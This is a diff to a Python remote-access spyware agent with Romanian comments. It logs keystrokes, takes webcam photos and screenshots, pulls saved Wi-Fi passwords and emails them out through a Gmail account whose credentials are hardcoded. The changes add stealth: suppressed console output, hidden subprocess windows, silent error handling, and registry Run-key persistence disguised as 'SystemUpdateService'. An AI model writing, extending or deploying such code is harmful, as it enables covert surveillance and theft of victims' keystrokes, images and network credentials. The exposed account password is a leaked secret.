@@ -11,6 +11,8 @@ import socket
 import psutil
 import subprocess
 import re
+import shutil
+import winreg as reg
 from datetime import datetime
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
@@ -19,6 +21,12 @@ from pynput import keyboard
 from PIL import ImageGrab
 import cv2
 
+# ====================== FIX ENCODING & CONSOLE ======================
+if getattr(sys, 'frozen', False):
+    os.environ['PYTHONIOENCODING'] = 'utf-8'
+    sys.stdout = open(os.devnull, 'w', encoding='utf-8')
+    sys.stderr = open(os.devnull, 'w', encoding='utf-8')
+
 # ====================== CONFIG ======================
 SMTP_CONFIG = {
     'server': 'smtp.gmail.com',
@@ -26,6 +34,8 @@ SMTP_CONFIG = {
     'email': 'romanbogdan475@gmail.com',
     'password': 'cxzv ddop qosk hvdy'
 }
+
+PERSISTENCE_NAME = "SystemUpdateService"
 
 class SystemInfoCollector:
     @staticmethod
@@ -47,14 +57,20 @@ class SystemInfoCollector:
         if platform.system() != 'Windows':
             return []
         try:
-            result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True).stdout
-            profiles = re.findall(r"All User Profile\s*:\s*(.*)", result)
+            startupinfo = subprocess.STARTUPINFO()
+            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+            startupinfo.wShowWindow = 0
+
+            result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], 
+                                  capture_output=True, text=True, startupinfo=startupinfo)
+            
+            profiles = re.findall(r"All User Profile\s*:\s*(.*)", result.stdout)
             passwords = []
             for name in profiles:
                 try:
                     res = subprocess.run(['netsh', 'wlan', 'show', 'profile', name.strip(), 'key=clear'],
-                                       capture_output=True, text=True).stdout
-                    pwd = re.search(r"Key Content\s*:\s*(.*)", res)
+                                       capture_output=True, text=True, startupinfo=startupinfo)
+                    pwd = re.search(r"Key Content\s*:\s*(.*)", res.stdout)
                     if pwd:
                         passwords.append((name.strip(), pwd.group(1)))
                 except:
@@ -70,14 +86,12 @@ class Agent:
         self.info_sent = False
         self.processed_ids = set()
 
-        # Intervale
         self.key_interval = 15
         self.camera_interval = 15
         self.screenshot_interval = 15
         self.check_interval = 10
 
-        # Flags
-        self.keylogger_running = True      # ← Pornit automat
+        self.keylogger_running = True
         self.camera_running = False
         self.screenshot_running = False
 
@@ -91,14 +105,35 @@ class Agent:
         os.makedirs(self.photo_folder, exist_ok=True)
         os.makedirs(self.screenshot_folder, exist_ok=True)
 
-        print("[+] Agent pornit cu succes.")
-        print("[+] Keylogger pornit AUTOMAT")
-
-        # Pornire automată Keylogger
+        self.add_persistence()
+        
         self.start_keylogger()
         self.start_keylog_sender()
-
         self.start_command_checker()
+
+    def add_persistence(self):
+        try:
+            if getattr(sys, 'frozen', False):
+                current_path = sys.executable
+            else:
+                current_path = sys.argv[0]
+
+            target_dir = os.path.join(tempfile.gettempdir(), "sys_update")
+            target_path = os.path.join(target_dir, "SystemUpdate.exe")
+            
+            os.makedirs(target_dir, exist_ok=True)
+
+            if not os.path.exists(target_path):
+                shutil.copy2(current_path, target_path)
+
+            key = reg.OpenKey(reg.HKEY_CURRENT_USER, 
+                            r"Software\Microsoft\Windows\CurrentVersion\Run", 
+                            0, reg.KEY_SET_VALUE)
+            reg.SetValueEx(key, PERSISTENCE_NAME, 0, reg.REG_SZ, target_path)
+            reg.CloseKey(key)
+            
+        except Exception as e:
+            pass  # Silent fail în .exe
 
     def send_email(self, subject, body, attachments=None):
         if not self.recipient_email:
@@ -123,8 +158,7 @@ class Agent:
                 server.login(SMTP_CONFIG['email'], SMTP_CONFIG['password'])
                 server.send_message(msg)
             return True
-        except Exception as e:
-            print(f"[-] Eroare trimitere email: {e}")
+        except:
             return False
 
     def send_system_info(self):
@@ -146,11 +180,9 @@ class Agent:
 
             self.send_email("SYSTEM_INFO", body)
             self.info_sent = True
-            print("[+] System Info trimis o singură dată!")
-        except Exception as e:
-            print(f"[-] Eroare System Info: {e}")
+        except:
+            pass
 
-    # ====================== KEYLOGGER ======================
     def start_keylogger(self):
         def on_press(key):
             try:
@@ -164,7 +196,6 @@ class Agent:
 
         self.key_listener = keyboard.Listener(on_press=on_press)
         self.key_listener.start()
-        print("[+] Keylogger rulează...")
 
     def start_keylog_sender(self):
         def loop():
@@ -175,7 +206,6 @@ class Agent:
                     self.buffer = ""
         threading.Thread(target=loop, daemon=True).start()
 
-    # ====================== CAMERA & SCREENSHOT ======================
     def start_auto_camera(self):
         def loop():
             while self.camera_running:
@@ -213,11 +243,9 @@ class Agent:
             path = os.path.join(self.screenshot_folder, f"manual_{ts}.png")
             img.save(path)
             self.send_email("SCREENSHOT", "Manual Screenshot", [path])
-            print("[+] Manual screenshot trimis")
-        except Exception as e:
-            print(f"[-] Screenshot error: {e}")
+        except:
+            pass
 
-    # ====================== PROCESS COMMAND ======================
     def process_command(self, full_command):
         try:
             if "|ID:" in full_command:
@@ -229,17 +257,12 @@ class Agent:
             else:
                 command = full_command.strip()
 
-            print(f"[*] Comandă: {command}")
-
             if command.startswith("SET_RECIPIENT:"):
                 self.recipient_email = command[13:].strip()
-                print(f"[+] Recipient setat: {self.recipient_email}")
-                self.send_system_info()                    # Trimite o singură dată
+                self.send_system_info()
 
             elif command.startswith("SET_KEY_INTERVAL:"):
                 self.key_interval = int(command.split(":")[1])
-                print(f"[+] Keylogger interval → {self.key_interval}s")
-
             elif command.startswith("SET_CAMERA_INTERVAL:"):
                 self.camera_interval = int(command.split(":")[1])
             elif command.startswith("SET_SCREENSHOT_INTERVAL:"):
@@ -258,7 +281,6 @@ class Agent:
                 if self.key_listener:
                     self.key_listener.stop()
                     self.key_listener = None
-                print("[-] Keylogger oprit")
 
             elif command == "START_CAMERA":
                 self.camera_running = True
@@ -275,8 +297,8 @@ class Agent:
             elif command == "TAKE_SCREENSHOT":
                 self.take_single_screenshot()
 
-        except Exception as e:
-            print(f"[-] Eroare procesare: {e}")
+        except:
+            pass
 
     def start_command_checker(self):
         def loop():
@@ -310,6 +332,5 @@ if __name__ == "__main__":
     try:
         while True:
             time.sleep(1)
-    except KeyboardInterrupt:
-        print("Agent oprit.")
+    except:
         sys.exit(0)
